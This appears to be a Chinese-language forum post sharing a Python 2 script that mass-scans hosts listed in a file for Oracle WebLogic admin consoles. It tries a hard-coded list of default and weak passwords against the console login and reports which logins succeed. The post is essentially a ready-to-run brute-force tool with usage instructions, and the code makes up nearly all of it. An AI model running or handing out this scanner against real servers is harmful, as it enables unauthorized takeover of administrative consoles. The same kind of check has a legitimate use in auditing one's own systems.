没啥技术含量，测试代码是wolf的那个扫描框架里面拿出来的，简单改了下，大牛勿喷......
之前测试的时候，遇到编码的问题，保存为utf8格式的才能准确的匹配中文.....
使用方法：
直接执行读取py同目录下的url.txt
txt内容格式为IP:PORT

#coding:utf-8
#author:一只特立独行的猪
import urllib2

flag_list=['<title>WebLogic Server Console</title>','javascript/console-help.js','WebLogic Server Administration Console Home','/console/console.portal','console/jsp/common/warnuserlockheld.jsp','/console/actions/common/','/console/console.portal','WebLogic Server 管理控制台主页','登录以使用 WebLogic Server 域']
user_list=['weblogic']
pass_list=['weblogic1','weblogic','password','Weblogic1','weblogic10','weblogic10g','weblogic11','weblogic11g','weblogic12','weblogic12g','weblogic13','weblogic13g','weblogic123','123456','12345678','123456789','admin123','admin888','admin1','administrator','8888888','123123','admin','manager','root']

def check(host,port,timeout):
    url = "http://%s:%d"%(host,int(port))
    error_i=0
    try:
        res = urllib2.urlopen(url+"/console/login/LoginForm.jsp")
        cookies = res.headers['Set-Cookie']
    except Exception,e:
        return 'NO'
    for user in user_list:
        for password in pass_list:
            try:
                PostStr='j_username=%s&j_password=%s&j_character_encoding=UTF-8'%(user,password)
                request = urllib2.Request(url+'/console/j_security_check',PostStr)
                request.add_header("Cookie",cookies)
                res = urllib2.urlopen(request,timeout=timeout)
                res_html = res.read()
            except urllib2.HTTPError,e:
                return 'NO'
            except urllib2.URLError,e:
                error_i+=1
                if error_i >= 3:
                    return 'NO'
                continue
            for flag in flag_list:
                if flag in res_html:
                    info = '%s/console Weblogic Weak password %s:%s'%(url,user,password)
                    return 'YES|'+info
    return 'NO'
        
'''
if __name__ == "__main__":
    result = check('8.8.8.8',7001,4000)
    print result
'''

if __name__ == "__main__":
    ff = open("url.txt")
    for i in ff:
        t = i.split('\n')[0].split(':')
        if len(t) == 1:
            port = 80
        else :
            port = t[1]
        try:
            result = check(t[0],port,2000)
            print result
        except:
            print "somthing error"
    ff.close()
